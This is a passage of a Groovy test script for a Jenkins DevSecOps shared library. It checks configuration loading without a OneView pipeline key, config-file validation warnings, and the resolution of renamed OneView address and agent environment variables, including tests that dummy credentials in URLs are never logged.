        "Write devSecOpsPipeline(pipelineKey: '<key from OneView>') in the Jenkinsfile, " +
        "or call devSecOpsApi.configure('full', [pipelineKey: '<key from OneView>']) in a custom Jenkinsfile"
String notLoaded = "[INIT] No configuration from OneView is loaded: call devSecOpsApi.configure('<variant>', [pipelineKey: '<key from OneView>']) before devSecOpsApi.initialize()"
Closure readFrom = { String file -> "[INIT] No pipeline key in the Jenkinsfile: the services come from ${file} in the repository, the global settings from the library (resources/com/bbh/devsecops/defaults.yaml)".toString() }
Closure touchesFile = { FakeScript s -> s.probes.any { it.tokenize(' ').last() in ['devsecops_config.yaml', 'config.yaml'] } }
Closure configWith = { Closure change ->
    Map config = yaml.load(configText) as Map
    change(config.projects as Map)
    yaml.dump(config)
}
Closure fromFile = { String variant, Map jenkinsfile, Map files ->
    FakeScript s = jenkins([ONEVIEW_URL: null])
    s.files.putAll(files)
    Map loaded = load(s, variant, jenkinsfile)
    loaded + [j: s, initError: loaded.error ?: initialize(loaded)]
}
Closure apiRun = { FakeScript s, Closure body ->
    SandboxHarness h = new SandboxHarness(srcDir, stubDir)
    FakeCpsScript a = h.loadVars(varsDir, s)['devSecOpsApi'] as FakeCpsScript
    String error = ''
    try {
        h.run { body(a) }
    } catch (Throwable t) {
        error = failureOf(t)
    }
    return [api: a, error: error, state: a.@_state]
}
Map agents = [agentNames: ['linux-agent']]

[[pipelineKey: ''], [pipelineKey: null], [pipelineKeys: []]].each { Map key ->
    Map empty = runWithoutKey('devSecOpsPipeline', key + agents, [ONEVIEW_URL: null], true)
    check("a named but empty key ${key}: today's No pipeline key error, nothing runs and no file is looked at",
            empty.crash == noKeyError && empty.untouched && (empty.probes as List).isEmpty(), empty.detail)
}

Map required = runWithoutKey('devSecOpsPipeline', agents, [ONEVIEW_URL: null, DSO_REQUIRE_PIPELINE_KEY: ' TRUE '], true)
check('DSO_REQUIRE_PIPELINE_KEY true: a Jenkinsfile without a key stops before pipeline {} with today\'s error',
        required.crash == noKeyError && required.untouched && (required.probes as List).isEmpty(), required.detail)
Map requiredApi = apiRun(jenkins([ONEVIEW_URL: null, DSO_REQUIRE_PIPELINE_KEY: 'true'])) { fake -> fake.initialize() }
check('DSO_REQUIRE_PIPELINE_KEY true: initialize() without configure() stops with today\'s error', requiredApi.error == notLoaded, requiredApi.error)
j = jenkins([ONEVIEW_URL: null, DSO_REQUIRE_PIPELINE_KEY: 'false'])
j.files['config.yaml'] = configText
r = load(j, 'full', agents)
check('DSO_REQUIRE_PIPELINE_KEY false: the same Jenkinsfile loads without a key',
        !r.error && r.state.configFile == 'devsecops_config.yaml or config.yaml' && j.calls.isEmpty(), r.error)

j = jenkins([ONEVIEW_URL: null])
j.files['devsecops_config.yaml'] = configText
Map configured = [:]
List callsBefore = []
List probesBefore = []
String placeBefore = ''
String placeAfter = ''
Map run = apiRun(j) { fake ->
    fake.configure('full', [projectNames: ['gui', 'backend-api'], agentNames: ['linux-agent'], securityPipeline: securityJob, appId: 'from-the-jenkinsfile'])
    configured = fake.pipelineConfig() as Map
    placeBefore = fake.settingsPlace()
    callsBefore = new ArrayList(j.calls)
    probesBefore = new ArrayList(j.probes)
    j.onAgent('linux-agent') { fake.initialize() }
    placeAfter = fake.settingsPlace()
}
check('configure() without a key keeps the Jenkinsfile values, takes no node, runs no step and looks at no file',
        configured.agentNames == ['linux-agent'] && configured.securityPipeline == securityJob && configured.projectNames == 'gui,backend-api'
                && configured.appId == 'from-the-jenkinsfile' && j.env.Security_Pipeline == securityJob && callsBefore.isEmpty() && probesBefore.isEmpty()
                && !j.log.any { it.startsWith('[ONEVIEW]') } && placeBefore == 'devsecops_config.yaml or config.yaml',
        "${configured} | ${callsBefore} | ${probesBefore} | ${placeBefore}")
runState = j.files['pipeline-config.yaml'] ? yaml.load(j.files['pipeline-config.yaml']) as Map : [:]
check('initialize() reads devsecops_config.yaml, names it and writes its services in file order to the run-state file',
        !run.error && j.log.contains(readFrom('devsecops_config.yaml')) && placeAfter == 'devsecops_config.yaml'
                && ((runState.projects ?: [:]) as Map).keySet().toList() == ['gui', 'backend-api'],
        "${run.error} | ${placeAfter} | ${runState.projects?.keySet()}")

String otherAppId = configWith { Map p -> (p.gui as Map).appId = 'from-the-repository-file' }
j = jenkins([:])
j.files['devsecops_config.yaml'] = otherAppId
String guiKey = OneViewFixtures.publish(j, gui)
r = load(j, 'full', agents)
r.harness.run { r.loader.load('full', [pipelineKey: guiKey]) }
initError = initialize(r)
check('configure() twice, without and then with a key: the key wins, the file is not looked at',
        !initError && !j.log.any { it.startsWith('[INIT] No pipeline key in the Jenkinsfile') } && r.state.configFile == ''
                && (r.state.projectsAllCfg as Map).keySet().toList() == ['gui'] && (r.state.projectsAllCfg.gui as Map).appId == '209f44ac-dd06-4ca0-884e-d944904f8020'
                && j.log.contains('[POLICY] Global settings from OneView, projects cannot change them:')
                && r.state.platform?.iosBuildAgent == 'mac002.bbh.com' && !touchesFile(j),
        "${initError} | ${r.state.configFile} | ${j.probes}")
j = jenkins([:])
j.files['devsecops_config.yaml'] = otherAppId
guiKey = OneViewFixtures.publish(j, gui)
r = load(j, 'full', [pipelineKey: guiKey])
r.harness.run { r.loader.load('full', agents) }
initError = initialize(r)
check('configure() twice, with and then without a key: the file wins, the OneView documents and platform values are dropped',
        !initError && j.log.contains(readFrom('devsecops_config.yaml')) && r.state.oneViewDocuments == [] && r.state.platform == [:]
                && (r.state.projectsAllCfg as Map).keySet().toList() == ['gui'] && (r.state.projectsAllCfg.gui as Map).appId == 'from-the-repository-file'
                && j.log.contains('[POLICY] Library security policy (resources/com/bbh/devsecops/defaults.yaml), projects cannot change it:'),
        "${initError} | ${r.state.oneViewDocuments} | ${r.state.platform}")

j = jenkins([ONEVIEW_URL: null, PROJECT_NAME: 'gui'])
j.files['config.yaml'] = configText
String customPlace = ''
run = apiRun(j) { fake ->
    j.onAgent('linux-agent') { fake.initialize() }
    customPlace = fake.settingsPlace()
}
runState = j.files['pipeline-config.yaml'] ? yaml.load(j.files['pipeline-config.yaml']) as Map : [:]
check('a custom Jenkinsfile that calls initialize() without configure() reads config.yaml as before OneView',
        !run.error && j.log.contains(readFrom('config.yaml')) && (run.state.projectsAllCfg as Map).keySet().toList() == ['gui'] && customPlace == 'config.yaml'
                && ((runState.projects ?: [:]) as Map).keySet().toList() == ['gui'],
        "${run.error} | ${customPlace} | ${runState.projects?.keySet()}")

Map noKeyId = fromFile('full', agents, ['config.yaml': configWith { Map p -> p.values().each { (((it as Map).asoc ?: [:]) as Map).remove('keyId') } }])
check('without a key: services without asoc.keyId start, and APPSCAN_KEY_ID is the key ID of the functional user from the library defaults',
        !noKeyId.initError && (noKeyId.j as FakeScript).env.APPSCAN_KEY_ID == libraryKeyId && !(noKeyId.j as FakeScript).log.any { it.contains('asoc.keyId in config.yaml ignored') },
        "${noKeyId.initError} | ${(noKeyId.j as FakeScript).env.APPSCAN_KEY_ID}")

Map invalid = fromFile('full', agents, ['devsecops_config.yaml': 'projects: ['])
check('without a key: a file that is not YAML names the file and the parser message', (invalid.initError as String).startsWith('[INIT] devsecops_config.yaml is not valid YAML: '), invalid.initError)

['', '- gui', 'defaults: {}'].each { String text ->
    Map empty = fromFile('full', agents, ['devsecops_config.yaml': text])
    check("without a key: a file without projects (${text ?: 'empty'}) is refused", empty.initError == "[INIT] devsecops_config.yaml must contain a 'projects:' section.", empty.initError)
}

Closure runStateOf = { FakeScript s -> s.files['pipeline-config.yaml'] ? ((yaml.load(s.files['pipeline-config.yaml']) as Map).projects ?: [:]) as Map : [:] }
Map unknown = fromFile('full', agents + [projectNames: 'web'], ['devsecops_config.yaml': configText])
check('without a key: a projectNames with no service of the file falls back to the default, every service of the file, and says so',
        !unknown.initError && (unknown.state.projectsAllCfg as Map).keySet().toList() == ['gui', 'backend-api'] && (unknown.j as FakeScript).env.PROJECT_NAMES == 'gui,backend-api'
                && runStateOf(unknown.j as FakeScript).keySet().toList() == ['gui', 'backend-api']
                && (unknown.j as FakeScript).log.contains('[INIT] [WARN] projectNames names web, which devsecops_config.yaml does not have - the run goes on with the default, every service of the file: gui, backend-api'),
        "${unknown.initError} | ${(unknown.state?.projectsAllCfg as Map)?.keySet()} | ${(unknown.j as FakeScript).log.findAll { it.contains('[WARN]') }}")
Map partly = fromFile('full', agents + [projectNames: ['web', 'backend-api']], ['devsecops_config.yaml': configText])
check('without a key: a projectNames with one unknown name runs the services the file has, and names the unknown one and the services of the file',
        !partly.initError && (partly.state.projectsAllCfg as Map).keySet().toList() == ['backend-api'] && partly.state.currentProjectName == 'backend-api'
                && runStateOf(partly.j as FakeScript).keySet().toList() == ['backend-api']
                && (partly.j as FakeScript).log.contains('[INIT] [WARN] projectNames names web, which devsecops_config.yaml does not have (it has gui, backend-api) - the run goes on with backend-api'),
        "${partly.initError} | ${(partly.state?.projectsAllCfg as Map)?.keySet()} | ${(partly.j as FakeScript).log.findAll { it.contains('[WARN]') }}")
Map everyName = fromFile('full', agents + [projectNames: 'gui,backend-api'], ['devsecops_config.yaml': configText])
Map ownOrder = fromFile('full', agents + [projectNames: 'backend-api,gui'], ['devsecops_config.yaml': configText])
Map plainFile = fromFile('full', agents, ['devsecops_config.yaml': configText])
String everyLine = '[INIT] [INFO] projectNames: gui, backend-api equals the default, every service of devsecops_config.yaml in its order - the parameter can be removed from the Jenkinsfile'
check('without a key: a projectNames that lists every service of the file in its order says that the parameter can be removed; another order says nothing',
        !everyName.initError && (everyName.j as FakeScript).log.contains(everyLine) && !ownOrder.initError && !(ownOrder.j as FakeScript).log.any { it.contains('the parameter can be removed') }
                && !(plainFile.j as FakeScript).log.any { it.contains('the parameter can be removed') },
        "${everyName.initError} | ${(everyName.j as FakeScript).log.findAll { it.startsWith('[INIT] [INFO]') }}")

List removable = (plainFile.j as FakeScript).log.findAll { it.startsWith('[INIT] [INFO] gui: ') }
check('without a key: a setting with the value the library would use anyway is named as one that can be removed, and not a value that differs or that the library cannot know',
        removable.contains('[INIT] [INFO] gui: deployTarget: vm equals the library default - the key can be removed from devsecops_config.yaml')
                && removable.contains('[INIT] [INFO] gui: sourceDir: . equals the library default - the key can be removed from devsecops_config.yaml')
                && !removable.any { it.contains('projectKey') || it.contains('javaPath') || it.contains('appId') },
        removable)

String detectedConfig = configWith { Map p ->
    (p.gui as Map).buildTool = 'maven'
    ((p.gui as Map).tools as Map).sonar = [projectKey: 'com.bbh:gui']
}
Map detected = fromFile('full', agents + [projectNames: 'gui'], ['devsecops_config.yaml': detectedConfig, 'pom.xml': '<project/>'])
List detectedLines = (detected.j as FakeScript).log.findAll { it.startsWith('[INIT] [INFO] gui: ') }
Map detectedOff = fromFile('full', agents + [projectNames: 'gui'], ['devsecops_config.yaml': detectedConfig])
check('without a key: a buildTool and a SonarQube key that the auto-resolve would find are named as removable; without the pom.xml the buildTool is not',
        !detected.initError && detectedLines.contains('[INIT] [INFO] gui: buildTool: maven equals the auto-detected value - the key can be removed from devsecops_config.yaml')
                && detectedLines.contains('[INIT] [INFO] gui: tools.sonar.projectKey: com.bbh:gui equals the auto-detected value - the key can be removed from devsecops_config.yaml')
                && !detectedOff.initError && !(detectedOff.j as FakeScript).log.any { it.contains('gui: buildTool: maven equals') }
                && (detected.state.projectsAllCfg.gui as Map).buildTool == 'maven' && !(detected.j as FakeScript).log.any { it.startsWith('[WARN] Invalid') },
        detectedLines)

String invalidConfig = configWith { Map p ->
    (p.gui as Map).sast = [maxCritical: 'none', pollTimeoutMin: '45']
    (p.gui as Map).sca = [enabled: 'enabled']
    (p.gui as Map).releaseGate = [scanners: [sast: true]]
}
Map invalidValues = fromFile('full', agents + [projectNames: 'gui'], ['devsecops_config.yaml': invalidConfig])
Map guiCfg = (invalidValues.state?.projectsAllCfg?.gui ?: [:]) as Map
List invalidLines = (invalidValues.j as FakeScript).log.findAll { it.startsWith('[INIT] [WARN] gui: ') }
check('without a key: a value of the wrong kind falls back to the library default with a warning; a number in quotes is kept',
        !invalidValues.initError && guiCfg.sast?.maxCritical == 0 && (guiCfg.sast?.pollTimeoutMin as String) == '45' && guiCfg.sca?.enabled == true
                && guiCfg.releaseGate?.scanners == ['sast', 'sca', 'niq', 'dast']
                && invalidLines.contains('[INIT] [WARN] gui: sast.maxCritical: none in devsecops_config.yaml is not a number - the library default sast.maxCritical: 0 is used instead')
                && invalidLines.contains('[INIT] [WARN] gui: sca.enabled: enabled in devsecops_config.yaml is not true or false - the library default sca.enabled: true is used instead')
                && invalidLines.contains('[INIT] [WARN] gui: releaseGate.scanners: [sast] in devsecops_config.yaml is not a list - the library default releaseGate.scanners: [sast, sca, niq, dast] is used instead')
                && invalidLines.size() == 3,
        "${invalidValues.initError} | ${invalidLines} | ${guiCfg.sast} | ${guiCfg.releaseGate}")

Map unscannedFile = fromFile('nexusiq', agents, ['devsecops_config.yaml': configWith { Map p ->
    (((p.gui as Map).tools as Map).nexusIq as Map).remove('application')
    (((p['backend-api'] as Map).tools as Map).nexusIq as Map).scanPatterns = []
}])
check('the Nexus IQ GoldenFix pipeline without a key names the file for a service it would not scan',
        unscannedFile.initError == '[INIT] The Nexus IQ GoldenFix pipeline would scan nothing for gui: set tools.nexusIq.application and its scanPatterns for the service in devsecops_config.yaml',
        unscannedFile.initError)

Map extendedFile = agents + [projectNames: 'gui,backend-api', securityPipeline: securityJob]
Map handoff = fromFile('extended', extendedFile, ['devsecops_config.yaml': configText, 'pipeline-config.yaml': yaml.dump(copied)])
Map handoffRd = ((((handoff.state?.projectsAllCfg as Map)?.get('backend-api') as Map)?.deploy as Map)?.openshift as Map)?.rd as Map
check('extended without a key: the run-time tags of the security run are laid over the services of the file, and a delivery value of the security run never replaces the delivery settings',
        !handoff.initError && handoffRd?.buildTag == '213-20261006-081500' && (handoff.state.projectsAllCfg.gui as Map).delivery != '57-20261006-081500',
        "${handoff.initError} | ${handoffRd}")
Map foreign = fromFile('extended', extendedFile, ['devsecops_config.yaml': configText, 'pipeline-config.yaml': yaml.dump([projects: [gui: copied.projects.gui]])])
check('extended without a key: a security run that lacks a service of this run is refused',
        foreign.initError == "[INIT] Security pipeline ${securityJob} builds gui, this run builds backend-api".toString(), foreign.initError)
String withWeb = configWith { Map p -> p.web = OneViewFixtures.copy(p.gui as Map) }
Map third = fromFile('extended', extendedFile, ['devsecops_config.yaml': withWeb, 'pipeline-config.yaml': yaml.dump(copied)])
runState = (third.j as FakeScript).files['pipeline-config.yaml'] ? yaml.load((third.j as FakeScript).files['pipeline-config.yaml']) as Map : [:]
check('extended without a key: a service of the file that this run does not build is neither checked nor written',
        !third.initError && ((runState.projects ?: [:]) as Map).keySet().toList() == ['gui', 'backend-api'], "${third.initError} | ${runState.projects?.keySet()}")
Map predates = fromFile('extended', extendedFile, ['devsecops_config.yaml': configText])
check('extended without a key: a security build from before the OneView integration says what to run',
        predates.initError == "[INIT] The last successful build of ${securityJob} has no pipeline-config.yaml: it predates the OneView integration; run ${securityJob} once".toString(),
        predates.initError)

Map fullWithJob = fromFile('full', agents + [securityPipeline: securityJob], ['devsecops_config.yaml': configText])
check('a full pipeline without a key that names a securityPipeline only sets Security_Pipeline, as before OneView',
        !fullWithJob.initError && (fullWithJob.j as FakeScript).env.Security_Pipeline == securityJob
                && !(fullWithJob.j as FakeScript).probes.contains('fileExists pipeline-config.yaml'),
        fullWithJob.initError)

j = jenkins([ONEVIEW_URL: null])
j.params.RUN_EXTENDED_PIPELINE = true
j.files['devsecops_config.yaml'] = configWith { Map p -> ((p.gui as Map).jenkins as Map).remove('pipeline') }
run = apiRun(j) { fake ->
    fake.configure('full', agents + [projectNames: 'gui'])
    j.onAgent('linux-agent') { fake.initialize() }
    fake.runExtendedPipeline()
}
FakeScript keyedJenkins = jenkins([:])
keyedJenkins.params.RUN_EXTENDED_PIPELINE = true
String keyedGui = OneViewFixtures.publish(keyedJenkins, gui)
Map keyedRun = apiRun(keyedJenkins) { fake ->
    fake.configure('full', [pipelineKey: keyedGui])
    keyedJenkins.onAgent('linux-agent') { fake.initialize() }
    fake.runExtendedPipeline()
}
check('a service message names the file without a key and OneView with a key',
        !run.error && j.log.contains('Skipping extended pipeline - jenkins.pipeline.extendedPipeline is not set for the service in devsecops_config.yaml')
                && !keyedRun.error && keyedJenkins.log.contains('Skipping extended pipeline - jenkins.pipeline.extendedPipeline is not set for the service in OneView'),
        "${run.error} | ${keyedRun.error} | ${(j.log + keyedJenkins.log).findAll { it.startsWith('Skipping') }}")

j = jenkins([:])
j.oneViewAnswer = [status: '404', body: FakeScript.problem('<key>', 404, 'Not found', 'Unknown OneView pipeline key')]
r = load(j, 'full', [pipelineKey: OneViewFixtures.key(1)])
check('unknown key: a problem detail that names OneView instead of DevSecOps is read as an unknown key too',
        r.error == "[ONEVIEW] Key ${OneViewFixtures.hint(OneViewFixtures.key(1))} was not issued by OneView at ${OneViewFixtures.ONEVIEW_URL}".toString(), r.error)

String formerAddress = 'https://dso-portal.apps.bbh.com'
String withSecret = 'https://reader:s3cret@oneview.apps.bbh.com'
String inFile = 'in devsecops_config.yaml'
String inLibrary = 'in resources/com/bbh/devsecops/defaults.yaml of the library'
String notAnAddressReason = "it is not an address of the form ${addressForm}".toString()
String reportHtml = '<html><body><h3>Pipeline Execution Report</h3></body></html>'
Closure renameLine = { String was, String is -> "[ONEVIEW] ${was} is the former name of ${is}: it still works; rename it ${variablePlace}".toString() }
Closure renameBlockLine = { String was, String is, String place -> "[ONEVIEW] ${was} is the former name of ${is}: it still works; rename the block portal: to oneview: ${place}".toString() }
Closure formerValueLine = { String was, String is, String place ->
    "[ONEVIEW] ${was} is the former name of ${is}: its value still works for the report upload as before; under the name ${is} it must be written as ${addressForm}, ${place}".toString()
}
Closure ignoredLine = { String name, String reason, String used, String place = variablePlace -> "[ONEVIEW] ${name} is ignored because ${reason}: ${used} is used instead; correct it ${place}".toString() }
Closure removableLine = { String was, String is, String place = variablePlace -> "[ONEVIEW] ${was} is the former name of ${is} and holds the same value: it can be removed ${place}".toString() }
Closure shadowedLine = { String was, String is -> "[ONEVIEW] ${is} is used: ${was}, its former name, holds another value and is ignored".toString() }
Closure notUploadedLine = { List<String> names ->
    "[ONEVIEW] The pipeline report is not uploaded: ${names.join(', ')} ${names.size() > 1 ? 'hold' : 'holds'} no address of OneView; a Jenkins administrator writes ONEVIEW_URL as ${addressForm}, ${variablePlace}".toString()
}
Closure sameKeyLine = { String name, String key, int count ->
    count == 1 ? "[ONEVIEW] ${name} holds the pipeline key of the Jenkinsfile (${OneViewFixtures.hint(key)}): the report is uploaded with the key of the Jenkinsfile without it, so it can be removed from the job".toString()
            : ("[ONEVIEW] ${name} holds one of the ${count} pipeline keys of the Jenkinsfile (${OneViewFixtures.hint(key)}), so the report is uploaded for that key only: " +
            "it can be removed from the job, and the report is then uploaded once for each key of the Jenkinsfile").toString()
}
Closure uploadingLine = { String target, String keyHint = '' ->
    "[ONEVIEW] Uploading pipeline report to ${target} for job CertScanner-build build 42${keyHint ? ' with pipeline key ' + keyHint : ''}".toString()
}
Closure namedTarget = { String name -> "the address in ${name} (path /api/dso/reports)".toString() }
Closure notices = { FakeScript s ->
    s.log.findAll { it.startsWith('[ONEVIEW] ') && (it.contains(' former name') || it.contains(' is ignored') || it.contains(' is not uploaded') || it.contains(' can be removed')) }
}
Closure leaks = { FakeScript s, Object error -> ([String.valueOf(error)] + s.log + s.calls).any { it.contains('s3cret') } }
Closure printed = { FakeScript s, Object error, String value ->
    ([String.valueOf(error), String.valueOf(s.currentBuild.description)] + s.log + s.calls.findAll { !it.startsWith('withEnv [ONEVIEW_URL=') }).any { it.contains(value) }
}
Closure recordPosts = { FakeScript s, List<Map> posts, Closure failFor = null ->
    s.shHandler = { Map a ->
        if (String.valueOf(a.script).contains('/api/dso/reports')) {
            Map payload = new JsonSlurperClassic().parseText(s.files[s.env.vars.get('ONEVIEW_FILE')] ?: '{}') as Map
            posts << [address: s.env.vars.get('ONEVIEW_URL'), key: payload.pipelineKey, html: payload.reportHtml]
            def verdict = failFor == null ? null : failFor(payload.pipelineKey, s.env.vars.get('ONEVIEW_URL'))
            if (verdict instanceof Throwable) throw (verdict as Throwable)
            if (verdict) {
                throw new FakeAbort("script returned exit code 22 after ${s.env.vars.get('ONEVIEW_URL')}/api/dso/reports answered".toString())
            }
        }
        ''
    }
}
Closure addressIn = { FakeScript s, String first ->
    def used = (s.calls.find { it.startsWith("withEnv [${first}=") } ?: '') =~ /ONEVIEW_URL=([^,\]]*)/
    used.find() ? used.group(1) : ''
}
Closure readWith = { Map env, boolean windows = false, Map onAgent = [:], String key = null ->
    FakeScript s = jenkins(env)
    s.unix = !windows
    s.nodeEnv.putAll(onAgent)
    String published = OneViewFixtures.publish(s, gui)
    Map result = load(s, 'full', [pipelineKey: key ?: published])
    [j: s, error: result.error, address: addressIn(s, 'ONEVIEW_DIR'), notices: notices(s), node: s.calls.find { it.startsWith('node ') } ?: '', leak: leaks(s, result.error), state: result.state]
}

[[rule : 'rule 1, the new name wins: ONEVIEW_URL alone is read and no line names a former name',
  env  : [ONEVIEW_URL: OneViewFixtures.ONEVIEW_URL], address: OneViewFixtures.ONEVIEW_URL, notices: []],
 [rule : 'rule 1, the new name wins: ONEVIEW_URL is read, and one line says that DSO_PORTAL_URL with another address is ignored',
  env  : [ONEVIEW_URL: OneViewFixtures.ONEVIEW_URL, DSO_PORTAL_URL: formerAddress], address: OneViewFixtures.ONEVIEW_URL, notices: [shadowedLine('DSO_PORTAL_URL', 'ONEVIEW_URL')]],
 [rule : 'rule 1, the new name wins: a DSO_PORTAL_URL that is not an address does not stop a build with a valid ONEVIEW_URL, and its value is not repeated',
  env  : [ONEVIEW_URL: OneViewFixtures.ONEVIEW_URL, DSO_PORTAL_URL: 'https://reader:s3cret@dso-portal.apps.bbh.com'], address: OneViewFixtures.ONEVIEW_URL,
  notices: [shadowedLine('DSO_PORTAL_URL', 'ONEVIEW_URL')]],
 [rule : 'rule 2, the former name is read: DSO_PORTAL_URL alone still works, its trailing slash is dropped, and one line says how to rename it',
  env  : [ONEVIEW_URL: null, DSO_PORTAL_URL: formerAddress + '/'], address: formerAddress, notices: [renameLine('DSO_PORTAL_URL', 'ONEVIEW_URL')]],
 [rule : 'rule 3, a new value that cannot be used: a blank ONEVIEW_URL is ignored with the reason and DSO_PORTAL_URL is read',
  env  : [ONEVIEW_URL: '  ', DSO_PORTAL_URL: formerAddress], address: formerAddress, notices: [ignoredLine('ONEVIEW_URL', 'it is blank', 'DSO_PORTAL_URL, its former name,')]],
 [rule : 'rule 3, a new value that cannot be used: an empty ONEVIEW_URL is ignored with the reason and DSO_PORTAL_URL is read',
  env  : [ONEVIEW_URL: '', DSO_PORTAL_URL: formerAddress], address: formerAddress, notices: [ignoredLine('ONEVIEW_URL', 'it is blank', 'DSO_PORTAL_URL, its former name,')]],
 [rule : 'rule 3, a new value that cannot be used: an ONEVIEW_URL with a user and a password is ignored with the reason and DSO_PORTAL_URL is read',
  env  : [ONEVIEW_URL: withSecret, DSO_PORTAL_URL: formerAddress], address: formerAddress, notices: [ignoredLine('ONEVIEW_URL', notAnAddressReason, 'DSO_PORTAL_URL, its former name,')]],
 [rule : 'rule 4, both names with the same address: ONEVIEW_URL is read and one line says that DSO_PORTAL_URL can be removed',
  env  : [ONEVIEW_URL: formerAddress, DSO_PORTAL_URL: formerAddress + '/'], address: formerAddress, notices: [removableLine('DSO_PORTAL_URL', 'ONEVIEW_URL')]]
].each { Map spec ->
    Map read = readWith(spec.env as Map)
    check("configuration read, ${spec.rule}",
            !read.error && read.address == spec.address && read.notices == spec.notices && !read.leak
                    && (read.j as FakeScript).calls.any { it.startsWith('sh [Read the configuration from OneView] ') },
            "${read.error} | ${read.address} | ${read.notices}")
}

[[name: 'neither name is set', env: [ONEVIEW_URL: null], error: notSet],
 [name: 'ONEVIEW_URL is blank and DSO_PORTAL_URL is empty', env: [ONEVIEW_URL: '  ', DSO_PORTAL_URL: ''], error: notSet],
 [name: 'only PORTAL_URL is set, which the configuration read never read', env: [ONEVIEW_URL: null, PORTAL_URL: formerAddress], error: notSet],
 [name: 'ONEVIEW_URL is not an address and DSO_PORTAL_URL is blank', env: [ONEVIEW_URL: withSecret, DSO_PORTAL_URL: ' '], error: notAnAddress],
 [name: 'only DSO_PORTAL_URL is set and it is not an address', env: [ONEVIEW_URL: null, DSO_PORTAL_URL: 'https://reader:s3cret@dso-portal.apps.bbh.com'],
  error: "[ONEVIEW] ONEVIEW_URL is not set and DSO_PORTAL_URL, its former name, is not the address of OneView: a Jenkins administrator sets ONEVIEW_URL to ${addressForm}, ${variablePlace}".toString()],
 [name: 'only DSO_PORTAL_URL is set, with an underscore in its host, which the report upload takes and the configuration read never took',
  env: [ONEVIEW_URL: null, DSO_PORTAL_URL: 'http://dso_portal:8080'],
  error: "[ONEVIEW] ONEVIEW_URL is not set and DSO_PORTAL_URL, its former name, is not the address of OneView: a Jenkins administrator sets ONEVIEW_URL to ${addressForm}, ${variablePlace}".toString()],
 [name: 'both names are set and neither is an address', env: [ONEVIEW_URL: withSecret, DSO_PORTAL_URL: 'dso-portal.apps.bbh.com/?token=s3cret'],
  error: "[ONEVIEW] ONEVIEW_URL is not the address of OneView, and neither is DSO_PORTAL_URL, its former name: a Jenkins administrator writes ONEVIEW_URL as ${addressForm}".toString()]
].each { Map spec ->
    Map read = readWith(spec.env as Map)
    check("configuration read, rule 3 and rule 5, the build fails only when neither name works: ${spec.name} - the message names ONEVIEW_URL, nothing runs and no value is repeated",
            read.error == spec.error && (read.error as String).contains('ONEVIEW_URL') && (read.j as FakeScript).calls.isEmpty() && !read.notices && !read.leak
                    && !printed(read.j as FakeScript, read.error, 'dso_portal'),
            "${read.error} | ${read.notices} | ${(read.j as FakeScript).calls}")
}

Closure onTheAgent = { ->
    String zoneB = 'https://dso-portal.zone-b.bbh.com'
    Map read = readWith([ONEVIEW_URL: null, DSO_PORTAL_URL: formerAddress], false, [DSO_PORTAL_URL: zoneB + '/'])
    check('configuration read on the agent: a DSO_PORTAL_URL that the agent sets is the address of the read, as before the rename, and the line about the former name is logged once',
            !read.error && read.address == zoneB && read.notices == [renameLine('DSO_PORTAL_URL', 'ONEVIEW_URL')] && read.node == 'node linux-agent',
            "${read.error} | ${read.address} | ${read.notices}")
    read = readWith([ONEVIEW_URL: OneViewFixtures.ONEVIEW_URL], false, [ONEVIEW_URL: 'https://oneview.zone-b.bbh.com/'])
    check('configuration read on the agent: an ONEVIEW_URL that the agent sets is the address of the read, without its trailing slash and without a line',
            !read.error && read.address == 'https://oneview.zone-b.bbh.com' && !read.notices, "${read.error} | ${read.address} | ${read.notices}")
    read = readWith([ONEVIEW_URL: null, DSO_PORTAL_URL: formerAddress], false, [ONEVIEW_URL: 'https://oneview.zone-b.bbh.com'])
    check('configuration read on the agent: the names are resolved again on the agent, so an ONEVIEW_URL set there wins over the DSO_PORTAL_URL of Jenkins, and each line is logged once',
            !read.error && read.address == 'https://oneview.zone-b.bbh.com'
                    && read.notices == [renameLine('DSO_PORTAL_URL', 'ONEVIEW_URL'), shadowedLine('DSO_PORTAL_URL', 'ONEVIEW_URL')],
            "${read.error} | ${read.address} | ${read.notices}")
    read = readWith([ONEVIEW_URL: OneViewFixtures.ONEVIEW_URL], false, [ONEVIEW_URL: withSecret])
    check('configuration read on the agent: an address that the agent sets is validated there too - the build stops on the agent before the query, with the message that names ONEVIEW_URL and without the value',
            read.error == notAnAddress && read.node == 'node linux-agent' && !querySh(read.j as FakeScript) && !read.leak && !(read.j as FakeScript).calls.any { it.startsWith('withEnv') },
            "${read.error} | ${(read.j as FakeScript).calls}")
    read = readWith([ONEVIEW_URL: OneViewFixtures.ONEVIEW_URL, DSO_PORTAL_URL: formerAddress], false, [ONEVIEW_URL: ' '])
    check('configuration read on the agent: an ONEVIEW_URL that the agent blanks is ignored there with the reason and the DSO_PORTAL_URL of Jenkins is read',
            !read.error && read.address == formerAddress
                    && read.notices == [shadowedLine('DSO_PORTAL_URL', 'ONEVIEW_URL'), ignoredLine('ONEVIEW_URL', 'it is blank', 'DSO_PORTAL_URL, its former name,')],
            "${read.error} | ${read.address} | ${read.notices}")
    read = readWith([ONEVIEW_URL: OneViewFixtures.ONEVIEW_URL], false, [ONEVIEW_URL: zoneB], OneViewFixtures.key(9))
    check('configuration read on the agent: a message about the answer names the address that was asked, the one of the agent',
            read.error == "[ONEVIEW] Key ${OneViewFixtures.hint(OneViewFixtures.key(9))} was not issued by OneView at ${zoneB}".toString(), read.error)
}
onTheAgent()

[[rule : 'rule 1, the new name wins: ONEVIEW_AGENT is used, and one line says that DSO_PORTAL_AGENT with another label is ignored',
  env  : [ONEVIEW_AGENT: 'oneview-reader && linux', DSO_PORTAL_AGENT: 'portal-reader'], node: 'node oneview-reader && linux', notices: [shadowedLine('DSO_PORTAL_AGENT', 'ONEVIEW_AGENT')]],
 [rule : 'rule 2, the former name is read: DSO_PORTAL_AGENT alone still works, and one line says how to rename it',
  env  : [DSO_PORTAL_AGENT: 'portal-reader && linux'], node: 'node portal-reader && linux', notices: [renameLine('DSO_PORTAL_AGENT', 'ONEVIEW_AGENT')]],
 [rule : 'rule 3, a new value that cannot be used: a blank ONEVIEW_AGENT is ignored with the reason and DSO_PORTAL_AGENT is used',
  env  : [ONEVIEW_AGENT: ' ', DSO_PORTAL_AGENT: 'portal-reader'], node: 'node portal-reader', notices: [ignoredLine('ONEVIEW_AGENT', 'it is blank', 'DSO_PORTAL_AGENT, its former name,')]],
 [rule : 'rule 3, neither name works: the read goes to linux-agent as without them, and the build goes on',
  env  : [ONEVIEW_AGENT: ' ', DSO_PORTAL_AGENT: ''], node: 'node linux-agent', notices: []],
